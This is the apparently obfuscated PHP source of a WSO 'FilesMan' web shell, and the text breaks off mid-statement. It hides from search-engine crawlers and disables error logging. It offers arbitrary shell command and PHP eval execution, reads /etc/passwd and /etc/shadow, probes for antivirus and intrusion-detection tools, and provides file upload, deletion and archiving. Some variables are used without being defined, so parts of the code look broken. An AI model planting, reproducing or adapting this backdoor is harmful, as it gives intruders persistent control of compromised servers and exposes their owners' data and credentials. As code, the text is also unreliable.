<?php
echo '[syslog]01
'; $sp76a070 = '866fd58d77526c1bda8771b5b21d5b11'; $sp34f272 = '#df5'; $spa13dd5 = 'FilesMan'; $sp39abfc = true; $spfe0679 = 'Windows-1251'; if (!empty($_SERVER['HTTP_USER_AGENT'])) { $spc1f1ad = array('Google', 'Slurp', 'MSNBot', 'ia_archiver', 'Yandex', 'Rambler', 'Bing'); if (preg_match('/' . implode('|', $spc1f1ad) . '/i', $_SERVER['HTTP_USER_AGENT'])) { header('HTTP/1.0 404 Not Found'); die; } } @ini_set('error_log', NULL); @ini_set('log_errors', 0); @ini_set('max_execution_time', 0); @define('WS_VER', '2'); if (get_magic_quotes_gpc()) { function WSOstripslashes($sp026f8c) { return is_array($sp026f8c) ? array_map('WSOstripslashes', $sp026f8c) : stripslashes($sp026f8c); } $_POST = WSOstripslashes($_POST); $_COOKIE = WSOstripslashes($_COOKIE); } function wsoLogin() { echo '[syslog]09_f
'; die('<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value=\'>>\'></form></pre>'); } function WSOsetcookie($sp8db113, $sp6d4391) { $_COOKIE[$sp8db113] = $sp6d4391; setcookie($sp8db113, $sp6d4391); } if (!empty($sp76a070)) { if (isset($_POST['pass']) && md5($_POST['pass']) == $sp76a070) { WSOsetcookie(md5($_SERVER['HTTP_HOST']), $sp76a070); } if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])]) || $_COOKIE[md5($_SERVER['HTTP_HOST'])] != $sp76a070) { wsoLogin(); } } if (strtolower(substr(PHP_OS, 0, 3)) == 'win') { $sp6050b9 = 'win'; } else { $sp6050b9 = 'nix'; } $spdda14d = @ini_get('safe_mode'); if (!$spdda14d) { error_reporting(0); } $sp4f8632 = @ini_get('disable_functions'); $spe8c9c2 = @getcwd(); if (isset($_POST['c'])) { @chdir($_POST['c']); } $sp570d5b = @getcwd(); if ($sp6050b9 == 'win') { $spe8c9c2 = str_replace('\\', '/', $spe8c9c2); $sp570d5b = str_replace('\\', '/', $sp570d5b); } if ($sp570d5b[strlen($sp570d5b) - 1] != '/') { $sp570d5b .= '/'; } if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'])) { $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool) $sp39abfc; } if ($sp6050b9 == 'win') { $sp481a00 = array('List Directory' => 'dir', 'IP Configuration' => 'ipconfig /all'); } else { $sp481a00 = array('List dir' => 'ls -lha', 'locate priv files' => 'locate priv'); } function wsoHeader() { if (empty($_POST['charset'])) { $_POST['charset'] = $sp2eb6c3['default_charset']; } global $sp34f272; echo '<html><head><meta http-equiv=\'Content-Type\' content=\'text/html; charset=' . $_POST['charset'] . '\'><title>' . $_SERVER['HTTP_HOST'] . ' - WSO ' . WS_VER . "</title>\r\n<style>\r\nbody{background-color:#444;color:#e1e1e1;}\r\nbody,td,th{ font: 9pt Lucida,Verdana;margin:0;vertical-align:top;color:#e1e1e1; }\r\ntable.info{ color:#fff;background-color:#222; }\r\nspan,h1,a{ color: {$sp34f272} !important; }\r\nspan{ font-weight: bolder; }\r\nh1{ border-left:5px solid {$sp34f272};padding: 2px 5px;font: 14pt Verdana;background-color:#222;margin:0px; }\r\ndiv.content{ padding: 5px;margin-left:5px;background-color:#333; }\r\na{ text-decoration:none; }\r\na:hover{ text-decoration:underline; }\r\n.ml1{ border:1px solid #444;padding:5px;margin:0;overflow: auto; }\r\n.bigarea{ width:100%;height:300px; }\r\ninput,textarea,select{ margin:0;color:#fff;background-color:#555;border:1px solid {$sp34f272}; font: 9pt Monospace,'Courier New'; }\r\nform{ margin:0px; }\r\n#toolsTbl{ text-align:center; }\r\n.toolsInp{ width: 300px }\r\n.main th{text-align:left;background-color:#5e5e5e;}\r\n.main tr:hover{background-color:#5e5e5e}\r\n.l1{background-color:#444}\r\n.l2{background-color:#333}\r\npre{font-family:Courier,Monospace;}\r\n</style>\r\n<script>\r\n    var c_ = '" . htmlspecialchars($sp2eb6c3['cwd']) . '\';
    var a_ = \'' . htmlspecialchars(@$_POST['a']) . '\'
    var charset_ = \'' . htmlspecialchars(@$_POST['charset']) . '\';
    var p1_ = \'' . (strpos(@$_POST['p1'], '
') !== false ? '' : htmlspecialchars($_POST['p1'], ENT_QUOTES)) . '\';
    var p2_ = \'' . (strpos(@$_POST['p2'], '
') !== false ? '' : htmlspecialchars($_POST['p2'], ENT_QUOTES)) . '\';
    var p3_ = \'' . (strpos(@$_POST['p3'], '
') !== false ? '' : htmlspecialchars($_POST['p3'], ENT_QUOTES)) . '\';
    var d = document;
	function set(a,c,p1,p2,p3,charset) {
		if(a!=null)d.mf.a.value=a;else d.mf.a.value=a_;
		if(c!=null)d.mf.c.value=c;else d.mf.c.value=c_;
		if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;
		if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;
		if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;
		if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;
	}
	function g(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		d.mf.submit();
	}
	function a(a,c,p1,p2,p3,charset) {
		set(a,c,p1,p2,p3,charset);
		var params = \'ajax=true\';
		for(i=0;i<d.mf.elements.length;i++)
			params += \'&\'+d.mf.elements[i].name+\'=\'+encodeURIComponent(d.mf.elements[i].value);
		sr(\'' . addslashes($_SERVER['REQUEST_URI']) . '\', params);
	}
	function sr(url, params) {
		if (window.XMLHttpRequest)
			req = new XMLHttpRequest();
		else if (window.ActiveXObject)
			req = new ActiveXObject(\'Microsoft.XMLHTTP\');
        if (req) {
            req.onreadystatechange = processReqChange;
            req.open(\'POST\', url, true);
            req.setRequestHeader (\'Content-Type\', \'application/x-www-form-urlencoded\');
            req.send(params);
        }
	}
	function processReqChange() {
		if( (req.readyState == 4) )
			if(req.status == 200) {
				var reg = new RegExp("(\\\\d+)([\\\\S\\\\s]*)", \'m\');
				var arr=reg.exec(req.responseText);
				eval(arr[2].substr(0, arr[1]));
			} else alert(\'Request error!\');
	}
</script>
<head><body><div style=\'position:absolute;width:100%;background-color:#444;top:0;left:0;\'>
<form method=post name=mf style=\'display:none;\'>
<input type=hidden name=a>
<input type=hidden name=c>
<input type=hidden name=p1>
<input type=hidden name=p2>
<input type=hidden name=p3>
<input type=hidden name=charset>
</form>'; $sp59c6e1 = @diskfreespace($sp2eb6c3['cwd']); $spd0b0bc = @disk_total_space($sp2eb6c3['cwd']); $spd0b0bc = $spd0b0bc ? $spd0b0bc : 1; $sp5a3145 = @php_uname('r'); $sp9f9cf6 = @php_uname('s'); $spbde02a = ''; if (strpos('Linux', $sp9f9cf6) !== false) { $spbde02a .= urlencode('Linux Kernel ' . substr($sp5a3145, 0, 6)); } else { $spbde02a .= urlencode($sp9f9cf6 . ' ' . substr($sp5a3145, 0, 3)); } if (!function_exists('posix_getegid')) { $sp8b0777 = @get_current_user(); $sped417e = @getmyuid(); $spe9607f = @getmygid(); $sp103103 = '?'; } else { $sped417e = @posix_getpwuid(posix_geteuid()); $spe9607f = @posix_getgrgid(posix_getegid()); $sp8b0777 = $sped417e['name']; $sped417e = $sped417e['uid']; $sp103103 = $spe9607f['name']; $spe9607f = $spe9607f['gid']; } $sp405fcc = ''; $sp149c6d = explode('/', $sp2eb6c3['cwd']); $sp5c3411 = count($sp149c6d); for ($sp412bbc = 0; $sp412bbc < $sp5c3411 - 1; $sp412bbc++) { $sp405fcc .= '<a href=\'#\' onclick=\'g("FilesMan","'; for ($sp460372 = 0; $sp460372 <= $sp412bbc; $sp460372++) { $sp405fcc .= $sp149c6d[$sp460372] . '/'; } $sp405fcc .= '")\'>' . $sp149c6d[$sp412bbc] . '/</a>'; } $sp2f96f9 = array('UTF-8', 'Windows-1251', 'KOI8-R', 'KOI8-U', 'cp866'); $sp9d79fb = ''; foreach ($sp2f96f9 as $sp527681) { $sp9d79fb .= '<option value="' . $sp527681 . '" ' . ($_POST['charset'] == $sp527681 ? 'selected' : '') . '>' . $sp527681 . '</option>'; } $sp8374c6 = array('Sec. Info' => 'SecInfo', 'Files' => 'FilesMan', 'Network' => 'Network'); if (!empty($sp2eb6c3['auth_pass'])) { $sp59d703 = ''; } foreach ($sp8374c6 as $sp8db113 => $sp6d4391) { $sp59d703 .= '<th width="' . (int) (100 / count($sp8374c6)) . '%">[ <a href="#" onclick="g(\'' . $sp6d4391 . '\',null,\'\',\'\',\'\')">' . $sp8db113 . '</a> ]</th>'; } $spb380a7 = ''; if ($sp2eb6c3['os'] == 'win') { foreach (range('c', 'z') as $sp9378fb) { if (is_dir($sp9378fb . ':\\')) { $spb380a7 .= '<a href="#" onclick="g(\'FilesMan\',\'' . $sp9378fb . ':/\')">[ ' . $sp9378fb . ' ]</a> '; } } } echo '<table class=info cellpadding=3 cellspacing=0 width=100%><tr><td width=1><span>Uname:<br>User:<br>Php:<br>Hdd:<br>Cwd:' . ($sp2eb6c3['os'] == 'win' ? '<br>Drives:' : '') . '</span></td>' . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href="' . $spbde02a . '" target=_blank>[exploit-db.com]</a></nobr><br>' . $sped417e . ' ( ' . $sp8b0777 . ' ) <span>Group:</span> ' . $spe9607f . ' ( ' . $sp103103 . ' )<br>' . @phpversion() . ' <span>Safe mode:</span> ' . ($sp2eb6c3['safe_mode'] ? '<font color=red>ON</font>' : '<font color=green><b>OFF</b></font>') . ' <a href=# onclick="g(\'Php\',null,\'\',\'info\')">[ phpinfo ]</a> <span>Datetime:</span> ' . date('Y-m-d H:i:s') . '<br>' . wsoViewSize($spd0b0bc) . ' <span>Free:</span> ' . wsoViewSize($sp59c6e1) . ' (' . (int) ($sp59c6e1 / $spd0b0bc * 100) . '%)<br>' . $sp405fcc . ' ' . wsoPermsColor($sp2eb6c3['cwd']) . ' <a href=# onclick="g(\'FilesMan\',\'' . $sp2eb6c3['home_cwd'] . '\',\'\',\'\',\'\')">[ home ]</a><br>' . $spb380a7 . '</td>' . '<td width=1 align=right><nobr><select onchange="g(null,null,null,null,null,this.value)"><optgroup label="Page charset">' . $sp9d79fb . '</optgroup></select><br><span>Server IP:</span><br>' . @$_SERVER['SERVER_ADDR'] . '<br><span>Client IP:</span><br>' . $_SERVER['REMOTE_ADDR'] . '</nobr></td></tr></table>' . '<table style="border-top:2px solid #333;" cellpadding=3 cellspacing=0 width=100%><tr>' . $sp59d703 . '</tr></table><div style="margin:5">'; } function wsoFooter() { $sp503ea0 = is_writable($sp2eb6c3['cwd']) ? ' <font color=\'green\'>(Writeable)</font>' : ' <font color=red>(Not writable)</font>'; echo '
</div>
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%  style=\'border-top:2px solid #333;border-bottom:2px solid #333;\'>
	<tr>
		<td><form onsubmit=\'g(null,this.c.value,"");return false;\'><span>Change dir:</span><br><input class=\'toolsInp\' type=text name=c value=\'' . htmlspecialchars($sp2eb6c3['cwd']) . "'><input type=submit value='>>'></form></td>\r\n\t\t<td><form onsubmit=\"g('FilesTools',null,this.f.value);return false;\"><span>Read file:</span><br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\r\n\t</tr><tr>\r\n\t\t<td><form onsubmit=\"g('FilesMan',null,'mkdir',this.d.value);return false;\"><span>Make dir:</span>{$sp503ea0}<br><input class='toolsInp' type=text name=d><input type=submit value='>>'></form></td>\r\n\t\t<td><form onsubmit=\"g('FilesTools',null,this.f.value,'mkfile');return false;\"><span>Make file:</span>{$sp503ea0}<br><input class='toolsInp' type=text name=f><input type=submit value='>>'></form></td>\r\n\t</tr><tr>\r\n\t\t<td><form onsubmit=\"g('Console',null,this.c.value);return false;\"><span>Execute:</span><br><input class='toolsInp' type=text name=c value=''><input type=submit value='>>'></form></td>\r\n\t\t<td><form method='post' ENCTYPE='multipart/form-data'>\r\n\t\t<input type=hidden name=a value='FilesMAn'>\r\n\t\t<input type=hidden name=c value='" . $sp2eb6c3['cwd'] . '\'>
		<input type=hidden name=p1 value=\'uploadFile\'>
		<input type=hidden name=charset value=\'' . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>\r\n\t\t<span>Upload file:</span>{$sp503ea0}<br><input class='toolsInp' type=file name=f><input type=submit value='>>'></form><br  ></td>\r\n\t</tr></table></div></body></html>"; } if (!function_exists('posix_getpwuid') && strpos($sp2eb6c3['disable_functions'], 'posix_getpwuid') === false) { function posix_getpwuid($spba2fc0) { return false; } } if (!function_exists('posix_getgrgid') && strpos($sp2eb6c3['disable_functions'], 'posix_getgrgid') === false) { function posix_getgrgid($spba2fc0) { return false; } } function wsoEx($spa16d92) { $spb3b003 = ''; if (function_exists('exec')) { @exec($spa16d92, $spb3b003); $spb3b003 = @join('
', $spb3b003); } elseif (function_exists('passthru')) { ob_start(); @passthru($spa16d92); $spb3b003 = ob_get_clean(); } elseif (function_exists('system')) { ob_start(); @system($spa16d92); $spb3b003 = ob_get_clean(); } elseif (function_exists('shell_exec')) { $spb3b003 = shell_exec($spa16d92); } elseif (is_resource($sp1b2b3c = @popen($spa16d92, 'r'))) { $spb3b003 = ''; while (!@feof($sp1b2b3c)) { $spb3b003 .= fread($sp1b2b3c, 1024); } pclose($sp1b2b3c); } return $spb3b003; } function wsoViewSize($sp1acd5c) { if (is_int($sp1acd5c)) { $sp1acd5c = sprintf('%u', $sp1acd5c); } if ($sp1acd5c >= 1073741824) { return sprintf('%1.2f', $sp1acd5c / 1073741824) . ' GB'; } elseif ($sp1acd5c >= 1048576) { return sprintf('%1.2f', $sp1acd5c / 1048576) . ' MB'; } elseif ($sp1acd5c >= 1024) { return sprintf('%1.2f', $sp1acd5c / 1024) . ' KB'; } else { return $sp1acd5c . ' B'; } } function wsoPerms($spba2fc0) { if (($spba2fc0 & 49152) == 49152) { $sp412bbc = 's'; } elseif (($spba2fc0 & 40960) == 40960) { $sp412bbc = 'l'; } elseif (($spba2fc0 & 32768) == 32768) { $sp412bbc = '-'; } elseif (($spba2fc0 & 24576) == 24576) { $sp412bbc = 'b'; } elseif (($spba2fc0 & 16384) == 16384) { $sp412bbc = 'd'; } elseif (($spba2fc0 & 8192) == 8192) { $sp412bbc = 'c'; } elseif (($spba2fc0 & 4096) == 4096) { $sp412bbc = 'p'; } else { $sp412bbc = 'u'; } $sp412bbc .= $spba2fc0 & 256 ? 'r' : '-'; $sp412bbc .= $spba2fc0 & 128 ? 'w' : '-'; $sp412bbc .= $spba2fc0 & 64 ? $spba2fc0 & 2048 ? 's' : 'x' : ($spba2fc0 & 2048 ? 'S' : '-'); $sp412bbc .= $spba2fc0 & 32 ? 'r' : '-'; $sp412bbc .= $spba2fc0 & 16 ? 'w' : '-'; $sp412bbc .= $spba2fc0 & 8 ? $spba2fc0 & 1024 ? 's' : 'x' : ($spba2fc0 & 1024 ? 'S' : '-'); $sp412bbc .= $spba2fc0 & 4 ? 'r' : '-'; $sp412bbc .= $spba2fc0 & 2 ? 'w' : '-'; $sp412bbc .= $spba2fc0 & 1 ? $spba2fc0 & 512 ? 't' : 'x' : ($spba2fc0 & 512 ? 'T' : '-'); return $sp412bbc; } function wsoPermsColor($sp1b2b3c) { if (!@is_readable($sp1b2b3c)) { return '<font color=#FF0000>' . wsoPerms(@fileperms($sp1b2b3c)) . '</font>'; } elseif (!@is_writable($sp1b2b3c)) { return '<font color=white>' . wsoPerms(@fileperms($sp1b2b3c)) . '</font>'; } else { return '<font color=#25ff00>' . wsoPerms(@fileperms($sp1b2b3c)) . '</font>'; } } function wsoScandir($spee51b5) { if (function_exists('scandir')) { return scandir($spee51b5); } else { $spcfdfd7 = opendir($spee51b5); while (false !== ($spcc5ae4 = readdir($spcfdfd7))) { $spf2bff7[] = $spcc5ae4; } return $spf2bff7; } } function wsoWhich($spba2fc0) { $sp149c6d = wsoEx('which ' . $spba2fc0); if (!empty($sp149c6d)) { return $sp149c6d; } return false; } function actionSecInfo() { wsoHeader(); echo '<h1>Server security information</h1><div class=content>'; function wsoSecParam($sp5c3411, $sp6d4391) { $sp6d4391 = trim($sp6d4391); if ($sp6d4391) { echo '<span>' . $sp5c3411 . ': </span>'; if (strpos($sp6d4391, '
') === false) { echo $sp6d4391 . '<br>'; } else { echo '<pre class=ml1>' . $sp6d4391 . '</pre>'; } } } wsoSecParam('Server software', @getenv('SERVER_SOFTWARE')); if (function_exists('apache_get_modules')) { wsoSecParam('Loaded Apache modules', implode(', ', apache_get_modules())); } wsoSecParam('Disabled PHP Functions', $sp2eb6c3['disable_functions'] ? $sp2eb6c3['disable_functions'] : 'none'); wsoSecParam('Open base dir', @ini_get('open_basedir')); wsoSecParam('Safe mode exec dir', @ini_get('safe_mode_exec_dir')); wsoSecParam('Safe mode include dir', @ini_get('safe_mode_include_dir')); wsoSecParam('cURL support', function_exists('curl_version') ? 'enabled' : 'no'); $spc44fb2 = array(); if (function_exists('mysql_get_client_info')) { $spc44fb2[] = 'MySql (' . mysql_get_client_info() . ')'; } if (function_exists('mssql_connect')) { $spc44fb2[] = 'MSSQL'; } if (function_exists('pg_connect')) { $spc44fb2[] = 'PostgreSQL'; } if (function_exists('oci_connect')) { $spc44fb2[] = 'Oracle'; } wsoSecParam('Supported databases', implode(', ', $spc44fb2)); echo '<br>'; if ($sp2eb6c3['os'] == 'nix') { wsoSecParam('Readable /etc/passwd', @is_readable('/etc/passwd') ? 'yes <a href=\'#\' onclick=\'g("FilesTools", "/etc/", "passwd")\'>[view]</a>' : 'no'); wsoSecParam('Readable /etc/shadow', @is_readable('/etc/shadow') ? 'yes <a href=\'#\' onclick=\'g("FilesTools", "/etc/", "shadow")\'>[view]</a>' : 'no'); wsoSecParam('OS version', @file_get_contents('/proc/version')); wsoSecParam('Distr name', @file_get_contents('/etc/issue.net')); if (!$sp2eb6c3['safe_mode']) { $sp2d6efd = array('gcc', 'lcc', 'cc', 'ld', 'make', 'php', 'perl', 'python', 'ruby', 'tar', 'gzip', 'bzip', 'bzip2', 'nc', 'locate', 'suidperl'); $spd109b3 = array('kav', 'nod32', 'bdcored', 'uvscan', 'sav', 'drwebd', 'clamd', 'rkhunter', 'chkrootkit', 'iptables', 'ipfw', 'tripwire', 'shieldcc', 'portsentry', 'snort', 'ossec', 'lidsadm', 'tcplodg', 'sxid', 'logcheck', 'logwatch', 'sysmask', 'zmbscap', 'sawmill', 'wormscan', 'ninja'); $sp2c68de = array('wget', 'fetch', 'lynx', 'links', 'curl', 'get', 'lwp-mirror'); echo '<br>'; $spc44fb2 = array(); foreach ($sp2d6efd as $sp527681) { if (wsoWhich($sp527681)) { $spc44fb2[] = $sp527681; } } wsoSecParam('Userful', implode(', ', $spc44fb2)); $spc44fb2 = array(); foreach ($spd109b3 as $sp527681) { if (wsoWhich($sp527681)) { $spc44fb2[] = $sp527681; } } wsoSecParam('Danger', implode(', ', $spc44fb2)); $spc44fb2 = array(); foreach ($sp2c68de as $sp527681) { if (wsoWhich($sp527681)) { $spc44fb2[] = $sp527681; } } wsoSecParam('Downloaders', implode(', ', $spc44fb2)); echo '<br/>'; wsoSecParam('HDD space', wsoEx('df -h')); wsoSecParam('Hosts', @file_get_contents('/etc/hosts')); echo '<br/><span>posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>'; if (isset($_POST['p2'], $_POST['p3']) && is_numeric($_POST['p2']) && is_numeric($_POST['p3'])) { $spc44fb2 = ''; for (; $_POST['p2'] <= $_POST['p3']; $_POST['p2']++) { $sped417e = @posix_getpwuid($_POST['p2']); if ($sped417e) { $spc44fb2 .= join(':', $sped417e) . '
'; } } echo '<br/>'; wsoSecParam('Users', $spc44fb2); } } } else { wsoSecParam('OS Version', wsoEx('ver')); wsoSecParam('Account Settings', wsoEx('net accounts')); wsoSecParam('User Accounts', wsoEx('net user')); } echo '</div>'; wsoFooter(); } function actionPhp() { if (isset($_POST['ajax'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true); ob_start(); eval($_POST['p1']); $spc44fb2 = 'document.getElementById(\'PhpOutput\').style.display=\'\';document.getElementById(\'PhpOutput\').innerHTML=\'' . addcslashes(htmlspecialchars(ob_get_clean()), '
	\\\' ') . '\';
'; echo strlen($spc44fb2), '
', $spc44fb2; die; } if (empty($_POST['ajax']) && !empty($_POST['p1'])) { WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0); } wsoHeader(); if (isset($_POST['p2']) && $_POST['p2'] == 'info') { echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>'; ob_start(); phpinfo(); $sp5a7cd5 = ob_get_clean(); echo '[syslog]02
'; $sp5a7cd5 = preg_replace(array('!(body|a:\\w+|body, td, th, h1, h2) {.*}!msiU', '!td, th {(.*)}!msiU', '!<img[^>]+>!msiU'), array('', '.e, .v, .h, .h th {$1}', ''), $sp5a7cd5); echo str_replace('<h1', '<h2', $sp5a7cd5) . '</div><br>'; } echo '<h1>Execution PHP-code</h1><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>' . (!empty($_POST['p1']) ? htmlspecialchars($_POST['p1']) : '') . '</textarea><input type=submit value=Eval style="margin-top:5px">'; echo ' <input type=checkbox name=ajax value=1 ' . ($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] ? 'checked' : '') . '> send using AJAX</form><pre id=PhpOutput style="' . (empty($_POST['p1']) ? 'display:none;' : '') . 'margin-top:5px;" class=ml1>'; if (!empty($_POST['p1'])) { ob_start(); eval($_POST['p1']); echo htmlspecialchars(ob_get_clean()); } echo '</pre></div>'; wsoFooter(); } function actionFilesMan() { if (!empty($_COOKIE['f'])) { $_COOKIE['f'] = @unserialize($_COOKIE['f']); } if (!empty($_POST['p1'])) { switch ($_POST['p1']) { case 'uploadFile': if (!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name'])) { echo 'Can\'t upload file!'; } break; case 'mkdir': if (!@mkdir($_POST['p2'])) { echo 'Can\'t create new dir'; } break; case 'delete': function deleteDir($sp149c6d) { $sp149c6d = substr($sp149c6d, -1) == '/' ? $sp149c6d : $sp149c6d . '/'; $spcfdfd7 = opendir($sp149c6d); while (($sp527681 = readdir($spcfdfd7)) !== false) { $sp527681 = $sp149c6d . $sp527681; if (basename($sp527681) == '..' || basename($sp527681) == '.') { continue; } $spa48979 = filetype($sp527681); if ($spa48979 == 'dir') { deleteDir($sp527681); } else { @unlink($sp527681); } } closedir($spcfdfd7); @rmdir($sp149c6d); } if (is_array(@$_POST['f'])) { foreach ($_POST['f'] as $sp1b2b3c) { if ($sp1b2b3c == '..') { continue; } $sp1b2b3c = urldecode($sp1b2b3c); if (is_dir($sp1b2b3c)) { deleteDir($sp1b2b3c); } else { @unlink($sp1b2b3c); } } } break; case 'paste': if ($_COOKIE['act'] == 'copy') { function copy_paste($sp559d1c, $sp1acd5c, $sp96625c) { if (is_dir($sp559d1c . $sp1acd5c)) { mkdir($sp96625c . $sp1acd5c); $sp4a7259 = @opendir($sp559d1c . $sp1acd5c); while (($sp1b2b3c = @readdir($sp4a7259)) !== false) { if ($sp1b2b3c != '.' and $sp1b2b3c != '..') { copy_paste($sp559d1c . $sp1acd5c . '/', $sp1b2b3c, $sp96625c . $sp1acd5c . '/'); } } } elseif (is_file($sp559d1c . $sp1acd5c)) { @copy($sp559d1c . $sp1acd5c, $sp96625c . $sp1acd5c); } } foreach ($_COOKIE['f'] as $sp1b2b3c) { copy_paste($_COOKIE['c'], $sp1b2b3c, $sp2eb6c3['cwd']); } } elseif ($_COOKIE['act'] == 'move') { function move_paste($sp559d1c, $sp1acd5c, $sp96625c) { if (is_dir($sp559d1c . $sp1acd5c)) { mkdir($sp96625c . $sp1acd5c); $sp4a7259 = @opendir($sp559d1c . $sp1acd5c); while (($sp1b2b3c = @readdir($sp4a7259)) !== false) { if ($sp1b2b3c != '.' and $sp1b2b3c != '..') { copy_paste($sp559d1c . $sp1acd5c . '/', $sp1b2b3c, $sp96625c . $sp1acd5c . '/'); } } } elseif (@is_file($sp559d1c . $sp1acd5c)) { @copy($sp559d1c . $sp1acd5c, $sp96625c . $sp1acd5c); } } foreach ($_COOKIE['f'] as $sp1b2b3c) { @rename($_COOKIE['c'] . $sp1b2b3c, $sp2eb6c3['cwd'] . $sp1b2b3c); } } elseif ($_COOKIE['act'] == 'zip') { if (class_exists('ZipArchive')) { $sp021d9f = new ZipArchive(); if ($sp021d9f->open($_POST['p2'], 1)) { chdir($_COOKIE['c']); foreach ($_COOKIE['f'] as $sp1b2b3c) { if ($sp1b2b3c == '..') { continue; } if (@is_file($_COOKIE['c'] . $sp1b2b3c)) { $sp021d9f->addFile($_COOKIE['c'] . $sp1b2b3c, $sp1b2b3c); } elseif (@is_dir($_COOKIE['c'] . $sp1b2b3c)) { $sp687824 = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($sp1b2b3c . '/', FilesystemIterator::SKIP_DOTS)); foreach ($sp687824 as $sp7ac89e => $sp8e17b7) { $sp021d9f->addFile(realpath($sp7ac89e), $sp7ac89e); } } } chdir($sp2eb6c3['cwd']); $sp021d9f->close(); } } } elseif ($_COOKIE['act'] == 'unzip') { if (class_exists('ZipArchive')) { $sp021d9f = new ZipArchive(); foreach ($_COOKIE['f'] as $sp1b2b3c) { if ($sp021d9f->open($_COOKIE['c'] . $sp1b2b3c)) { $sp021d9f->extractTo($sp2eb6c3['cwd']); $sp021d9f->close(); } } } } elseif ($_COOKIE['act'] == 'tar') { chdir($_COOKIE['c']); $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']); wsoEx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f'])); chdir($sp2eb6c3['cwd']); } unset($_COOKIE['f']); setcookie('f', '', time() - 3600); break; default: if (!empty($_POST['p1'])) { WSOsetcookie('act', $_POST['p1']); WSOsetcookie('f', serialize(@$_POST['f'])); WSOsetcookie('c', @$_POST['c']); } break; } } wsoHeader(); echo '<h1>File manager</h1><div class=content><script>p1_=p2_=p3_="";</script>'; $spea6e47 = wsoScandir(isset($_POST['c']) ? $_POST['c'] : $sp2eb6c3['cwd']); if ($spea6e47 === false) { echo 'Can\'t open this folder!'; wsoFooter(); return; } global $spbc4c0f; $spbc4c0f = array('name', 1); if (!empty($_POST['p1'])) { if (preg_match('!s_([A-z]+)_(\\d{1})!', $_POST['p1'], $spd3b0e2)) { $spbc4c0f = array($spd3b0e2[1], (int) $spd3b0e2[2]); } } echo '<script>
	function sa() {
		for(i=0;i<d.files.elements.length;i++)
			if(d.files.elements[i].type == \'checkbox\')
				d.files.elements[i].checked = d.files.elements[0].checked;
	}
</script>
<table width=\'100%\' class=\'main\' cellspacing=\'0\' cellpadding=\'2\'>
<form name=files method=post><tr><th width=\'13px\'><input type=checkbox onclick=\'sa()\' class=chkbx></th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_name_' . ($spbc4c0f[1] ? 0 : 1) . '")\'>Name</a></th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_size_' . ($spbc4c0f[1] ? 0 : 1) . '")\'>Size</a></th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_modify_' . ($spbc4c0f[1] ? 0 : 1) . '")\'>Modify</a></th><th>Owner/Group</th><th><a href=\'#\' onclick=\'g("FilesMan",null,"s_perms_' . ($spbc4c0f[1] ? 0 : 1) . '")\'>Permissions</a></th><th>Actions</th></tr>'; $sp495c2d = $spf2bff7 = array(); $sp5c3411 = count($spea6e47); for ($sp412bbc = 0; $sp412bbc < $sp5c3411; $sp412bbc++) { $spdc02c3 = @posix_getpwuid(@fileowner($spea6e47[$sp412bbc])); $spd8ebab = @posix_getgrgid(@filegroup($spea6e47[$sp412bbc])); $sp5a7cd5 = array('name' => $spea6e47[$sp412bbc], 'path' => $sp2eb6c3['cwd'] . $spea6e47[$sp412bbc], 'modify' => date('Y-m-d H:i:s', @filemtime($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc])), 'perms' => wsoPermsColor($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc]), 'size' => @filesize($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc]), 'owner' => $spdc02c3['name'] ? $spdc02c3['name'] : @fileowner($spea6e47[$sp412bbc]), 'group' => $spd8ebab['name'] ? $spd8ebab['name'] : @filegroup($spea6e47[$sp412bbc])); if (@is_file($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc])) { $spf2bff7[] = array_merge($sp5a7cd5, array('type' => 'file')); } elseif (@is_link($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc])) { $sp495c2d[] = array_merge($sp5a7cd5, array('type' => 'link', 'link' => readlink($sp5a7cd5['path']))); } elseif (@is_dir($sp2eb6c3['cwd'] . $spea6e47[$sp412bbc])) { $sp495c2d[] = array_merge($sp5a7cd5, array('type' => 'dir')); } } $sp2eb6c3['sort'] = $spbc4c0f; function wsoCmp($spd09f64, $sp20e3ac) { if ($sp2eb6c3['sort'][0] != 'size') { return strcmp(strtolower($spd09f64[$sp2eb6c3['sort'][0]]), strtolower($sp20e3ac[$sp2eb6c3['sort'][0]])) * ($sp2eb6c3['sort'][1] ? 1 : -1); } else { return ($spd09f64['size'] < $sp20e3ac['size'] ? -1 : 1) * ($sp2eb6c3['sort'][1] ? 1 : -1); } } usort($spf2bff7, 'wsoCmp'); usort($sp495c2d, 'wsoCmp'); $spf2bff7 = 